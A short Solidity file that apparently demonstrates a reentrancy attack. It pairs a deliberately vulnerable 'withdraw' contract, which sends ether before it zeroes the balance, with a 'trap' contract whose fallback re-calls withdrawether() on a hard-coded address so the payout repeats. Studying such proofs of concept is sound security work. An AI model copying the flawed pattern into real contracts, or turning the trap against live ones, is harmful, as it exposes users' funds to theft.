pragma solidity ^0.4.8;

contract trap{
    function()payable{
        address addr=0x0eF1F377f6040a8eA1d6ccBBB18866c857e205EA;
        if(addr.call(bytes4(sha3("withdrawether()"))))
        {}
    }
    function getbalance()constant returns(uint){}
    function deposit(address addr,uint x)returns(bool){
        x=x*(10**18);
        if(!addr.call.gas(200000).value(x)(bytes4(sha3("deposit()"))))
            return false;
        return true;
    }
    function customer_withdraw(address addr) returns (bool){
        
        return withdraw(addr).withdrawether();
        
    }
}
contract newcustomer{
    function()payable{}
    function getbalance()constant returns(uint){
        return this.balance;
    } 
    function deposit(address addr,uint x)returns(bool){
        x=x*(10**18);
        if(!addr.call.gas(200000).value(x)(bytes4(sha3("deposit()"))))
            return false;
        return true;
    }
    function customer_withdraw(address addr) returns (bool){
        
        return withdraw(addr).withdrawether();
        
    }
    
}
contract withdraw{
    mapping(address=>uint)account;
    function deposit() payable returns(bool){
        account[msg.sender]+=msg.value;
    }
    function withdrawether() returns(bool){
        uint bal=account[msg.sender];
        if(!msg.sender.send(bal))
            return false;
        account[msg.sender]=0;
        return true;
    }
}
